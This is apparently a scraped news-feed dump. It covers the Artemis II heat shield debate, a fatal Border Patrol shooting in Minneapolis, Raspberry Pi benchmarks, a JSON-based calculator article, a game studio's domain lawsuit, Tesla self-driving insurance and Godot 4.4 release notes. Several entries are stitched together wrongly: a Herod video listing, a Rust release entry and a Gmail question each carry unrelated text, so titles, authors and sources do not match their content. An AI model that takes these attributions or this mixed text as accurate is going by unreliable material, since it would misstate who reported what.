The issue relates to a special coating applied to the bottom part of the spacecraft, called the heat shield... This vital part of the Orion spacecraft is nearly identical to the heat shield flown on Artemis I, an uncrewed 2022 test flight. That prior mission's Orion vehicle returned from space with a heat shield pockmarked by unexpected damage — prompting NASA to investigate the issue. And while NASA is poised to clear the heat shield for flight, even those who believe the mission is safe acknowledge there is unknown risk involved. "This is a deviant heat shield," said Dr. Danny Olivas, a former NASA astronaut who served on a space agency-appointed independent review team that investigated the incident. "There's no doubt about it: This is not the heat shield that NASA would want to give its astronauts." Still, Olivas said he believes after spending years analyzing what went wrong with the heat shield, NASA "has its arms around the problem..." 

"I think in my mind, there's no flight that ever takes off where you don't have a lingering doubt," Olivas said. "But NASA really does understand what they have. They know the importance of the heat shield to crew safety, and I do believe that they've done the job." Lakiesha Hawkins, the acting deputy associate administrator for NASA's Exploration Systems Development Mission Directorate, echoed that sentiment in September, saying, "from a risk perspective, we feel very confident." And Reid Wiseman, the astronaut set to command the Artemis II mission, has expressed his confidence. "The investigators discovered the root cause, which was the key" to understanding and solving the heat shield issue, Wiseman told reporters last July. "If we stick to the new reentry path that NASA has planned, then this heat shield will be safe to fly." 
Others aren't so sure. "What they're talking about doing is crazy," said Dr. Charlie Camarda, a heat shield expert, research scientist and former NASA astronaut. Camarda — who was also a member of the first space shuttle crew to launch after the 2003 Columbia disaster — is among a group of former NASA employees who do not believe that the space agency should put astronauts on board the upcoming lunar excursion. He said he has spent months trying to get agency leadership to heed his warnings to no avail... Camarda also emphasized that his opposition to Artemis II isn't driven by a belief it will end with a catastrophic failure. He thinks it's likely the mission will return home safely. More than anything, Camarda told CNN, he fears that a safe flight for Artemis II will serve as validation for NASA leadership that its decision-making processes are sound. And that's bound to lull the agency into a false sense of security, Camarda warned. 
CNN adds that Dr. Dan Rasky, an expert on advanced entry systems and thermal protection materials who worked at NASA for more than 30 years, also does not believe NASA should allow astronauts to fly on board the Artemis II Orion capsule. 

And "a crucial milestone could be days away as Artemis program leaders gather for final risk assessments and the flight readiness review," when top NASA brass determine whether the Artemis II rocket and spacecraft are ready to take off with a human crew.]]></content:encoded></item><item><title>The AI Delusion Epidemic</title><link>https://medium.com/ai-advances/the-ai-delusion-epidemic-a851e0a4d842?sk=c629df4365a925426dcc5ab851861da2</link><author>/u/TheDeadlyPretzel</author><category>ai</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 18:33:11 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Historical Tyrants: Herod the Great | Middle Eastern History</title><link>https://www.youtube.com/watch?v=FaHQNoC5NZU</link><author>Extra History</author><category>yt</category><enclosure url="https://www.youtube.com/v/FaHQNoC5NZU?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 18:29:59 +0000</pubDate><source url="https://www.youtube.com/channel/UCCODtTcd5M1JavPCOr_Uydg">Extra History</source><content:encoded><![CDATA[📚  When you're done learning about the Historical Tyrant Herod the Great, go to https://PIAVPN.com/ExtraHistory to get 83% off from our sponsor Private Internet Access with 4 months free!

The Department of Homeland Security said the situation was 'evolving' but claimed that the man who was killed had a firearm and two magazines. The shooting comes less than three weeks after the fatal shooting of Renee Good, which has already sparked protests across the city. Thousands of Immigration and Customs Enforcement, or ICE, agents, along with Border Patrol, have since been deployed to the Democratic‑led city as Republican President Donald Trump intensifies his nationwide campaign to deport immigrants.

His family said he was motivated to join protests after Good's killing. Several videos of the shooting show an altercation taking place around 9 am when a woman protester was pushed to the ground by a Border Patrol agent. When Pretti attempts to stand between the agent and the woman, the agent pepper-sprays him in the face. More agents join the fray and tackle Pretti to the ground as he is disoriented. As a group of agents restrain Pretti on the ground, one emerges from the melee with a gun, and soon after, a shot rings out, then several more in quick succession. At least 10 shots were fired in around five seconds, including several as Pretti lay motionless on the ground. : Minnesotans Shutter Businesses and Call Off Work in Economic Blackout Day to Protest ICEPresident Donald Trump responded to the shooting in a lengthy post on Truth Social that called immigration agents "patriots" and claimed they were in Minneapolis because of "massive Monetary Fraud" and "Illegal Criminals that were allowed to infiltrate the State."Minneapolis Police Chief Brian O’Hara said at a press conference on Saturday afternoon that Pretti had not been in trouble with the police before."The only interaction that we are aware of with law enforcement has been for traffic tickets and we believe he is a lawfully gun owner with a permit to carry," O’Hara said. The Department of Homeland Security (DHS) gave a detailed account of the shooting in a statement that was contradicted by several videos shot by bystanders at the scene. The agency said it was carrying out a "targeted operation" when an individual approached U.S. Border Patrol officers with a 9mm semi-automatic handgun, pictures of which it shared with the media. It said officers attempted to disarm the man, but he "violently resisted.""Fearing for his life and the lives and safety of fellow officers, an agent fired defensive shots. Medics on scene immediately delivered medical aid to the subject but was pronounced dead at the scene," the statement continued. It added: "[T]his looks like a situation where an individual wanted to do maximum damage and massacre law enforcement." But severalvideos showing the lead-up to the fatal shooting show Pretti filming a group of Border Patrol officers with his phone in his right hand, with his left hand empty. The video shows an agent pepper-spraying Pretti in the face and, together with several other officers, dragging him to the ground. That is when the fatal shooting occurs.: Fatal ICE Shooting Sparks Scrutiny of Killings in Trump’s Immigration Crackdown The incident is the latest in a series of shootings in which the DHS claims the victim was threatening the life of an agent, only for video evidence to later contradict the claim. After the shooting of Renee Good, the DHS accused her of “attempting to run over our law enforcement officers in an attempt to kill them—an act of domestic terrorism,” only for video evidence to show her turning her car away, and the agent positioned to the side of her vehicle when he fired the fatal shot. Several other federal officials gave accounts of events that were similarly inaccurate to those given by DHS. Pretti's parents, Michael and Susan Pretti, found out about the death of their son when they were called by an Associated Press reporter. As of Saturday evening, the family had still not heard from anyone at a federal law enforcement agency about their son’s death, according to the AP. In a statement released to the media, the family criticised the "sickening lies told about our son by the administration." "Alex is clearly not holding a gun when attacked by Trump’s murdering and cowardly ICE thugs. He has his phone in his right hand and his empty left hand is raised above his head while trying to protect the woman ICE just pushed down all while being pepper sprayed," the statement said. Saturday's shooting prompted a wave of anger from local politicians, many of whom have been calling for the Trump Administration to bring an end to its immigration surge following weeks of violent encounters with Minnesotans, including the use of pepper spray and the arrest of peaceful protesters. Minnesota Governor Tim Walz described the shooting as "sickening" and called on President Trump to end his immigration crackdown in the state.Minn. Gov. Tim Walz Calls on Trump to End Immigration Crackdown After Second Fatal Shooting“I just spoke with the White House after another horrific shooting by federal agents this morning. Minnesota has had it. This is sickening,” Walz said in a post on X.“The President must end this operation. Pull the thousands of violent, untrained officers out of Minnesota. Now.”Later, he urged people protesting the shooting to do so peacefully. “We want peace, they want chaos,” the governor said of the federal government. “We cannot and will not give them what they want.”Democratic Senator Amy Klobuchar said: To the Trump administration and the Republicans in Congress who have stood silent: Get ICE out of our state NOW.O'Hara, in his press conference, called for greater discipline from the estimated 3,000 federal immigration agents in the city.  "Our demand today is for those federal agencies that are operating in our city to do so with the same discipline, humanity and integrity that effective law enforcement in this country demands," he said. A few hundred protesters gathered at the scene of the shooting in south Minneapolis by noon, where they scuffled with federal agents who had blocked off the intersection. Protesters screamed "I smell Nazis" at the federal agents and shouted at them to "go home."The agents deployed tear gas and used pepper-spray as they fought running battles with protesters.The shooting comes a day after thousands took to the streets across Minnesota on Friday, closing down businesses and calling out of work in a mass protest against the Trump Administration’s immigration crackdown in the state.The “Ice Out of Minnesota: Day of Truth and Freedom” demonstration, organized by community leaders, members of the clergy, and labor unions, called for a “no work, no school, no shopping” economic blackout.Trump, in his Saturday afternoon post, accused Minneapolis Mayor Jacob Frey and Governor Walz of "inciting Insurrection.""Where are the local Police? Why weren’t they allowed to protect ICE Officers? The Mayor and the Governor called them off? It is stated that many of these Police were not allowed to do their job, that ICE had to protect themselves — Not an easy thing to do!" he wrote. As night fell across Minneapolis, many residents set out candles in their windows to memorialize Pretti. Several vigils were held across the city. A New York  reporter visited one at Painter Park, near Pretti’s home, where more than 100 people gathered with candles and sang the opening lines to 'This Little Light of Mine.']]></content:encoded></item><item><title>SEC drops lawsuit against Winklevoss twins’ Gemini crypto exchange</title><link>https://techcrunch.com/2026/01/24/sec-drops-lawsuit-against-winklevoss-twins-gemini-crypto-exchange/</link><author>Anthony Ha</author><category>tech</category><pubDate>Sat, 24 Jan 2026 18:06:33 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[The Securities and Exchange Commission has dropped its lawsuit against Gemini, the crypto exchange founded by Trump backers Cameron and Tyler Winklevoss.]]></content:encoded></item><item><title>Raspberry Pi Drag Race: Pi 1 to Pi 5 – Performance Comparison</title><link>https://the-diy-life.com/raspberry-pi-drag-race-pi-1-to-pi-5-performance-comparison/</link><author>verginer</author><category>hn</category><pubDate>Sat, 24 Jan 2026 18:06:00 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Today we’re going to be taking a look at what almost 13 years of development has done for the Raspberry Pi. I have one of each generation of Pi from the original Pi that was launched in 2012 through to the Pi 5 which was released just over a year ago.We’ll take a look at what has changed between each generation and how their performance and power consumption has improved by running some tests on them.Here’s my video of the testing process and results, read on for the write-up;Purchase Links For Components Used In These TestsSome of the above parts are affiliate links. By purchasing products through the above links, you’ll be supporting this channel, at no additional cost to you.Hardware Changes Through Each GenerationThis is the original Raspberry Pi, which was launched in February 2012.This Pi has a Broadcom BCM2835 SOC which features a single ARM1176JZF-S core running at 700MHz along with a VideoCore IV GPU. It has 512 MB of DDR RAM.In terms of connectivity, it only has 100Mb networking and 2 x USB 2.0 ports. Video output is 1080P through a full-size HDMI port or analogue video out through a composite video connector and audio output is provided through a 3.5mm audio jack. It doesn’t have any WiFi or Bluetooth connectivity but it does have some of the features that we still have on more recent models like DSI and CSI ports, a full size SD card reader for the operating system and GPIO pins, although only 26 of them at this stage.Power is supplied through a micro USB port and it is rated for 5V and 700mA.It was priced at $35 – which at the time was incredibly cheap for what was essentially a palm-sized computer.The Raspberry Pi 2 was launched 3 years later, in February 2015 and this Pi looked quite different to the original and similar to the Pi’s we know today.The Pi 2 has a significantly better processor than the original. The Broadcom BCM2836 SOC has 4 Cortex-A7 cores running at 900 MHz and it retained the same VideoCore IV GPU. RAM was also bumped up to 1GB.It added another 2 x USB 2.0 ports alongside the 100Mb Ethernet port. The composite video port disappeared and the analogue video output was moved into the audio jack.The GPIO pins were increased to 40 pins which has followed the same pin layout since – which has really helped in maintaining compatibility with hats and accessories. The SD card reader was also changed to a microSD card reader.The power circuitry was bumped up to 800mA to accommodate the more powerful CPU.The Raspberry Pi 3 was launched just a year later, in February 2016.The Pi 3’s new Broadcom BCM2837 SOC retained the same 4-core architecture but these were changed to 64-bit Cortex A53 cores running at 1.2Ghz.RAM was kept at 1GB but was now DDR2.There was no change to the USB or Ethernet connectivity on the original Pi 3 but we did see WiFi and Bluetooth added for the first time. WiFi was single band 2.4GHz and we had Bluetooth 4.1.The version that I have is actually the 3B+, which was launched a little later. The main improvements over the original Pi 3 were a 0.2GHz boost to the clock speed and the upgrade to Gigabit networking with PoE (Power over Ethernet) support and dual-band WiFi.The power circuitry was again improved, still running at 5V but now up to 1.34A, which was almost double the Pi 2.Next came the Pi 4 in June 2019. This Pi came at one of the worst times for global manufacturing and was notoriously difficult to get hold of due to the impact of COVID on the global supply chain. Quite ironically, this hard-to-get Pi is the one that I’ve got the most of, mainly due to my water-cooled Pi cluster build.The Pi 4 has a Broadcom BCM2711 SOC with 4 Cortex-A72 cores running at 1.5GHz. So again a slight clock speed increase over the Pi 3 but still retaining 4 cores. It also includes a bump up to a VideoCore VI GPU.This was the first model to feature different RAM configurations. It was originally available in 1, 2, 4GB variants featuring LPDDR4 RAM and in March of 2020 an 8GB variant was added to the linup as well. This obviously resulted in a few different price points but impressively they still managed to keep a $35 offering 7 years after the launch of the first Pi.It retained the same form factor as the Pi 3 but with the network and Ethernet ports switched around. Notably, two of the USB ports were upgraded to USB 3.0, networking was now gigabit ethernet like the 3B+, WiFi was dual-band and it had Bluetooth 5.0.They also changed the single full-size HDMI port to two micro HDMI ports. Most people I know don’t like this change and find it annoying to have to use adaptors to work with common displays and these micro HDMI ports are prone to breaking when they are used often. I think general hobbyists and makers would prefer this to still be a single full-size port but Pi’s are often used in commercial display applications so I guess that’s why they went with this dual micro HDMI configuration.The power circuit was actually reduced in this model, from 1.34 down to 1.25A and the port was changed to USB C.Lastly and most recently we have the Pi 5 which was launched in October 2023.This Pi features a Broadcom BCM2712 SOC with 4 Cortex A76 cores running at a significantly faster 2.4Ghz and a VideoCore VII GPU running at 800MHz.So quite a bump up in CPU and GPU performance.It is offered in 3 RAM configurations but the drop in a 1GB offering means that they’re no longer available at the $35 price point. There is a fairly significant increase in price up to $50 for the base 2GB variant.Some other notable changes are the inclusion of a PCIe port which enables IO expansion and a much improved power circuit. The PCIe port is quite commonly used to add an NVMe SSD instead of a microSD card for the operating system.The power circuit was upgraded to handle the PCIe port addition, now stepping up to 5V at up to 5A, along with a power button for the first time.The change in power supply requirements to 5V and 5A is a bit annoying as most power delivery capable supplies cap out 2.5 or 3A at 5V. It would have been more universal to require a 9V 3A supply to meet the Pis power requirements. I assume they steered away from this because the Pi’s circuitry runs at 5V and 3.3V and they would have then needed to add another onboard DC-DC converter which increases complexity, size and potentially the cost, it would also have made it a bit less efficient. But this does mean that you most likely need to buy a USB C power supply that has been purpose-built for the Pi 5.The Pi 5 is also the first Pi to have its own dedicated fan socket.So that’s a summary of the hardware changes, now let’s boot them up and take a look at their performance.Testing The Performance Of Each Generation Of PiTo compare the performance between the Pi’s, I’m going to run the following tests.I’m going to attempt to playback a  in the browser, although I expect we’ll have problems with this up to the Pi 4.We’ll then run a  which I’ll do both for a single-core and multicore.Then we’ll run a .Then test the storage speed using James Chambers Pi Benchmark script.Then we’ll run an  test.Lastly, we’ll look at , both at idle and with the CPU maxed out.And then use that data to determine each Pi’s .To keep things as consistent as possible I’m going to be running the latest available version of Pi OS from Raspberry Pi Imager for each Pi. I was pleasantly surprised to find that you can still flash an OS image for the original Pi in their latest version of Imager.I’ll be testing them all running on a 32GB Sandisk Ultra microSD card. I’ll also be using an Ice Tower cooler on each to ensure they don’t run anywhere near thermal throttling.1080P YouTube Video PlaybackI started with the original Pi and its first boot and setup process was a lesson in patience. It took me the best part of two hours to get the first boot complete, the Pi updated and the testing utilities installed but I got there in the end.Even once set up it takes about 8 minutes to boot up to the desktop and the CPU stays pegged at 100% for another two to three minutes before dropping down to about 20% at idle.The original Pi refused to open up the browser, so that’s where my YouTube video playback test ended.The Pi 2 managed to open the browser and actually started playing back a 1080P video, which was surprising, but playback was terrible. It dropped pretty much all of the frames both in the window and fullscreen.The Pi 3 played video back noticeably better than the Pi 2, but it’s still quite a long way away from being usable and still drops a lot of frames.The Pi 4 handled 1080P video reasonably well. It had some initial trouble but then settled down. Fullscreen is also a bit choppy but is also usable.The Pi 5 handled 1080P playback well without any significant issues both in the window and fullscreen.Next was the Sysbench CPU benchmark. I ran three tests on each and averaged the scores and I did this for both single-core and multicore.In single core, the Pi 1 managed a rather dismal score of 68, the Pi 2 got a bit more than double this score but the real step up was with the Pi 3 which managed 18 times higher than the Pi 2. The Pi 4 and Pi 5 also offered good improvements on the previous generations.Similarly in multicore, the Pi 3 scored over 18 times the score of the Pi2 and the Pi 4 and 5 provided good improvements on the Pi 3’s score.Comparing the combined multicore score of the Pi 5 to what the single core on the Pi 1 can do, the Pi 5 is a little over 600 times faster.Next, I tried running a GLMark2 GPU benchmark on them. I used the GLMark2-es2-wayland version which is designed for OpenGL ES so that the Pi 1 was supported.I was surprised that the Pi 1 was even able to run GLMark2 – it did complete the benchmark, although the score wasn’t all that impressive.These results really show how the Pi’s GPU has improved in the last two generations. Prior to these tests, I had never seen a score below 100 and the Pi 1, 2 and 3 managed to fall short of triple digits. Pi 5 scored over 2.5 times higher than the Pi 4.Next was the storage speed test using James Chambers Pi Benchmarks script. The bus speed has increased over the years from 25MHz on the Pi 1 to 100MHz on the Pi 5, so I expect we’ll see these reflected in the benchmark scores.The storage speed test’s results aren’t as dramatic as the CPU and GPU results but show a steady improvement between generations. The Pi 3 did a bit worse than the Pi 2 but this small difference is likely just due to variability in the tests.Next, I ran the iPerf network speed test on each.The Pi 1 doesn’t quite get close to its theoretical 100Mbps but the Pi 2 does. The Pi 3 B+ although having Gigabit Ethernet is limited by this running over USB 2.0 which only has a theoretical maximum of 300MBps, so it came quite close. Both the Pi 4 and 5 expectedly come close to theoretical Gigabit speeds.Lastly, I tested the power consumption of each Pi at idle and under load.I used the same Pi 5 power adaptor to test all of the Pis to keep things consistent and I just used a USB C to micro USB adaptor for the Pi 1, 2 and 3.The idle results were closer than I expected. The Pi 2 had the lowest idle power draw and the Pi 5 the highest, but all were within a watt or two of each other. At full load, you can see the increase in CPU power draw more physical power with the Pi 5 drawing almost three times the Pi 1 and Pi 2.Converted to performance per watt using the Sysbench results, we can again see how much better the Pi 4 and 5 are over the Pi 1 and 2. There is a clear improvement in the performance that each generation of Pi is able to get per watt of power, which is essentially its efficiency. Although the Pi 5 draws more power than the Pi 1 under full load, you’re getting almost 200 times more power out of it per watt.Final Thoughts On The Drag Race And Future PisI really enjoyed working through this project to see how much Pi’s have changed over the years, particularly in terms of performance. I still remember being amazed at the size and price of the original Pi when it came out and it’s great that they’re still fully supported and can still be used for projects – albeit with less CPU-intensive projects.Let me know what you think has been the biggest improvement to the Pi over the years and what you’d still like to see added to future models in the comments section below.I personally really like the addition of the PCIe port on the Pi 5 and I’d like to see 2.5Gb networking and a DisplayPort or USB C with DisplayPort added to a future generation of Pi.]]></content:encoded></item><item><title>How to Build an AI Generated Calculator Without Custom JavaScript</title><link>https://hackernoon.com/how-to-build-an-ai-generated-calculator-without-custom-javascript?source=rss</link><author>Simon Y.

It also helps if the approach is based on industry standards for which there is lots of documentation and examples that have probably been consumed by LLMs during training. cCOM and JPRX do this; they incorporate concepts and syntax from JSON Pointers, JSON Schema, and XPath.\
In my previous article, to show how a cDOM and JPRX work, I used a reactive counter, but let's be real: reactive counters and to-do lists are easy. Any framework looks elegant when the logic fits on a napkin. To prove a JSON-based approach actually holds up, you need a problem with messy state, edge cases, and distinct modes of operation. You need a calculator.\
Calculators are inherently tricky:Input Modes: Are we typing a fresh number or appending to an existing one?Chaining: What happens when you hit `+` then `-` then `*` without hitting equals?-DRY Logic: How do we minimize code differences between 10 handlers for buttons 0-9? \n So, I asked Claude Opus to build a fully functional, iOS-style calculator using zero custom JavaScript functions - just declarative cDOM and JPRX expressions. The fact that AI could produce a declarative calculator with little prompting purely from documentation demonstrates another point I made in my earlier article: cDOM and JPRX aren't just new syntax. They can be a protocol for human-machine collaboration. \n To reduce characters and quotation noise while allowing inline explanation, I am using cDOMC, a compressed version of a cDOM. A regular cDOM does not support comments and requires quotes around attributes and JPRX expressions. When represented with quotes and without comments, cDOM can be treated as regular JSON.{

Lightview supports hypermedia capability similar to  by allowing the use of the  attribute on almost any element.\
Simply reference a  file using :<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
    <meta name="description"
      content="A beautiful calculator built with Lightview cDOM and JPRX reactive expressions - no custom JavaScript!">
    <title>Calculator | Lightview cDOM</title>    
    <link rel="stylesheet" href="calculator.css">    
    <!-- Load Lightview scripts -->    
    <script src="/lightview.js"></script>  <!-- DOM as JSON and reactivity support -->    
    <script src="/lightview-x.js"></script> <!-- hypermedia support -->    
    <script src="/lightview-cdom.js"></script> <-- cDOM/JPRX support -->
    </head>
  <body>    
    <!-- The calculator cDOM is loaded via Lightview's hypermedia src attribute -->    
    <div id="app" src="./calculator.cdomc"></div>
  </body>
</html>
\
The  attribute works like an HTML  or  tag - Lightview automatically fetches the  file, parses it, and renders the reactive content into the target element. This approach:You might look at concat("$('/c/prev') ...") and ask: Why in the world wouldn't you just writeparseFloat(prev) + parseFloat(curr)\
If you are a human writing code for yourself? You probably would. Lightview supports standard JS handlers for exactly that reason.\
But if you are building infrastructure for , the calculus changes. Sticking to a declarative, JSON-based path offers things raw code can't:: It executes in a controlled environment. The logic can't access `window`, make global fetch requests, or execute arbitrary secondary code. This makes it safe to "hot swap" UI logic generated by an LLM in real-time.: This entire UI—logic and all—is just data. It can be sent from a server, stored in a database, or streamed from an AI model.: It forces a clear separation between state transformations and view structure, which is exactly how LLMs reason best.\n This calculator proves that "declarative" doesn't have to mean "dumb." With the right primitives - state, conditionals, and path-based referencing—you can build rich, complex interactions without ever leaving the data structure.This series isn't just about a new library. It's about finding the right abstraction layer for the AI age.\n In this article, we showed that "Data as UI" doesn't mean "dumb UI." We handled state, context, data snapshots, math, and DOM navigation with ‘xpath’ without executing a single line of custom JavaScript.\n cDOM defines structure. JPRX defines behavior. It’s reactivity without the compilation and UI without the security risks.The complete calculator is available at:]]></content:encoded></item><item><title>CachyOS Starts 2026 By Switching To Plasma Login Manager &amp; Live ISO Using Wayland</title><link>https://www.phoronix.com/news/CachyOS-January-2026</link><author>Michael Larabel</author><category>tech</category><pubDate>Sat, 24 Jan 2026 17:50:40 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[The Arch Linux powered CachyOS distribution is out with its first new ISO release of 2026.

But it's not clear what the results are. 

UAE officials said the negotiations were held in a 'constructive and positive atmosphere.' The two days of meetings put officials from Kyiv, Moscow and Washington in the same room. That's a first for the process aiming to end nearly four years of Russia's full-scale war against Ukraine. Ukrainian President Voloydymr Zelenskyy said he expected more dialogue with Russia as early as next week, while Russian media is reporting that the Kremlin is open to further talks.  

The talks were clouded by a wave of overnight strikes on Ukraine, which killed at least one person and injured more than 20 others. President Volodymyr Zelenskyy says the aerial assault was among the heaviest in weeks.

U.S. insurer Lemonade said on Wednesday it would offer a 50% rate cut for drivers of Tesla electric vehicles when the automaker's Full Self-Driving (FSD) driver assistance software is steering because it had data showing it reduced accidents. Lemonade's move is an endorsement of Tesla CEO Elon Musk's claims that the company's vehicle technology is safer than human drivers, despite concerns flagged by regulators and safety experts. 

As part of a collaboration, Tesla is giving Lemonade access to vehicle telemetry data that will be used to distinguish between miles driven by FSD — which requires a human driver's supervision — and human driving, the New York-based insurer said. The price cut is for Lemonade's pay-per-mile insurance.
"We're looking at this in extremely high resolution, where we see every minute, every second that you drive your car, your Tesla," Lemonade co-founder Shai Wininger told Reuters. "We get millions of signals emitted by that car into our systems. And based on that, we're pricing your rate." 

Wininger said data provided by Tesla combined with Lemonade's own insurance data showed that the use of FSD made driving about two times safer for the average driver. He did not provide details on the data Tesla shared but said no payments were involved in the deal between Lemonade and the EV maker for the data and the new offering... Wininger said the company would reduce rates further as Tesla releases FSD software updates that improve safety. "Traditional insurers treat a Tesla like any other car, and AI like any other driver," Wininger said. "But a driver who can see 360 degrees, never gets drowsy, and reacts in milliseconds isn't like any other driver."]]></content:encoded></item><item><title>What&apos;s in Rust 1.77.2?</title><link>https://hackernoon.com/whats-in-rust-1772?source=rss</link><author>Rust (Technical Documentation)</author><category>tech</category><pubDate>Sat, 24 Jan 2026 17:30:04 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[The Rust team has published a new point release of Rust, 1.77.2.

The psychiatrist and Holocaust survivor began recording the stories of other survivors in the late 1970s. This is a film about the power of listening.

When Dori Laub began recording the stories of other survivors in the late 1970s, he was preserving memory. But he was also pioneering a radical act of listening. He recognized the power of listening to life stories as a way of helping survivors cope with trauma. His work led to the creation of the world’s first video testimony archive and shaped a unique therapeutic approach centered on presence, empathy, and witness.  

The documentary follows the final four years of Laub’s life (2015-2018), interweaving powerful archival testimonies with intimate glimpses into his own story: a childhood in Romanian camps, a love affair with the daughter of a former Nazi officer, and the moment his own children hear his testimony for the first time. His legacy echoes today in the work of Edut 710, a project inspired by Laub’s methods to document the voices of survivors of the October 7 Hamas massacre.

Tina Kowalewski, Taylor Kurosaki, and Nick Kononelos filed a complaint against co-founder and former CEO Michael Mumbauer on Tuesday in a California court. [Game studio] That's No Moon, which was founded in 2020 by veterans of Infinity Ward, Naughty Dog, and other AAA studios, said in its complaint that Mumbauer is looking to "cripple" the studio after being fired in 2022... 

Mumbauer, according to the complaint, purchased the domain name, and several others, when the studio was founded; it said both parties agreed these would be controlled by the studio. Mumbauer allegedly still has access to the domains, and That's No Moon said he took control over the website on Jan. 6, disabled the studio's access, and turned off employees' ability to email external addresses. The team was locked out for two days as a four-person IT team worked to get the services back online. On the public-facing side, the website briefly redirected to the Travel Switzerland page, according to the complaint. That's No Moon's lawyers said the co-founders sent Mumbauer a letter on Jan. 7 demanding he "relinquish his unauthorized access." That's when, according to the compliant, the website started redirecting to a GoDaddy Auction site, where the domain was priced at $6,666,666; That's No Moon remarked in the complaint: "A number that [Mumbauer] may well have selected for its Satanic connotation." 

As of Wednesday, Aftermath was able to access a public-facing That's No Moon website using both the original domain and the new one... The charges listed as part of this lawsuit are trademark infringement, cybersquatting, computer fraud, conversion, trespass to chattels, and breach of contract. That's No Moon also asked a judge for a temporary restraining order to prevent Mumbauer from continued access to the domains. Mumbauer has not responded to Aftermath's request for comment. Mumbauer said, in an email to That's No Moon attorney Amit Rana published as part of the lawsuit, that he intends to file "a wrongful termination countersuit and will be seeking extensive damages...." 

That's No Moon hasn't yet announced its first game, but has said the game is led by creative director Taylor Kurosaki and game director Jacob Minkoff. South Korean publisher Smilegate invested $100 million into the company, That's No Moon announced in 2021.]]></content:encoded></item><item><title>Programming Idea</title><link>https://www.reddit.com/r/golang/comments/1qlrg2u/programming_idea/</link><author>/u/tomiis4</author><category>golang</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 16:29:10 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hi, so little backstory to this post. I started programming when I was still at primary school. It was for about two years, then it's almost 4 years where I haven't been programming because I was burned out, but now I want to start again, maybe create something little but useful but mainly for fun. It started at front-end, but later moved to back-end and CLI applications. That's where I feel in love with that type of programming - not focusing on look (even though I'm capable of something simple and good looking) but mainly function. For example 3D rendering using JavaScript, many NeoVim plugins using Lua and some simpler using GoLang. It has been one of my most favorite language I have ever tried, but I haven't used it that much for personal projects. I have done couple CLI games, tool but it wasn't something long term or "big".I want to get back to programming, but I don't have any project ideas which would interest me and could take some time to finish (like month or more). Preferably GoLang, but I wouldn't mind using, or mixing another languages. So my question is what would you recommend me to do, to get back into programming again or something. Thank you.My favorites projects I have enjoyed so far were - 3D .obj parsing -> rendering -> rotating website from scratch, with textures - VIM inspired TypeScript CLI text editor - NVim RegExp explaining plugin, from scratch and more, mainly focused on "technical" part.]]></content:encoded></item><item><title>Ask HN: Gmail spam filtering suddenly marking everything as spam?</title><link>https://news.ycombinator.com/item?id=46744807</link><author>goopthink</author><category>hn</category><pubDate>Sat, 24 Jan 2026 16:16:02 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Almost all transactional emails are being marked as suspicious even when their SPF/DKIM records are fine and they’ve been whitelisted before.

We merged more than 200 PRs for the first dev snapshot, and just two weeks later, here we are with another batch of 350+ improvements for you to test and provide feedback on!\
Many of the changes in this release are bug fixes that will be backported to Godot 4.3 and released in 4.3.1! So please test this release well so we can be confident with the changes and release 4.3.1 with them as soon as possible.\
Keep in mind that while we try to make sure each dev snapshot is stable enough for general testing, this is by definition a pre-release piece of software. Be sure to make frequent backups, or use a version control system such as Git, to preserve your projects in case of corruption or data loss.\
Jump to the  section, and give it a spin right now, or continue reading to learn more about improvements in this release. You can also try the  or the  for this release. If you are interested in the latter, please request to join our testing group to get access to pre-release builds.The original cover illustration is from, an addictive inventory management roguelike, developed in Godot 4.3 by axilirate and published by Ravenage Games. It was recently released on Steam with big success. You can follow the development on Twitter.In case you missed it, check the 4.4 dev 1 release notes for an overview of some key features which were already in that snapshot, and are therefore still available for testing in dev 2.\
This new snapshot adds a lot more features which had been queued during the stabilization phase for Godot 4.3, and were thus ready for merging early on in the 4.4 development cycle.Godot 4.0 introduced supported for typed arrays, but lacked support for typed dictionaries. This rapidly became one of the most requested features to add to the engine, and thanks to Thaddeus Crews, it is now implemented for Godot 4.4! This feature impacts the core engine, GDScript, and all other scripting languages when interfacing with Godot’s Dictionary type. You can now export typed dictionaries from scripts and benefit from a much improved Inspector UX to assign the right keys and values.@export var typed_key_value: Dictionary[int, String] = { 1: "first value", 2: "second value", 3: "etc" }
@export var typed_key: Dictionary[int, Variant] = { 0: "any value", 10: 3.14, 100: null }
@export var typed_value: Dictionary[Variant, int] = { "any value": 0, 123: 456, null: -1 }
As a related improvement, support for StringName dictionary keys has also been optimized by Rune (GH-70096).Error-less first project importIt is commonplace for Godot users using version control systems to exclude the  folder from their repositories, as it contains files which can be re-created by Godot the first time you edit the project.\
One drawback of this system is that this first launch of the editor without  folder is typically quite noisy, with hundreds of errors spammed about missing resources, and various scripts failing to compile due to s not being known yet, addons not being registered yet, or yet unknown GDExtension classes.\
Hilderin valiantly fought their way through this labyrinth of dependencies and multi-threading pitfalls, and brought us back the long awaited grail: error-less first import of projects, which should work without requiring an editor restart! This took a lot of effort with GH-92303 (for GDScript s, included in 4.3) and now GH-93972 (for GDExtensions) and GH-92667 (for plugins).\
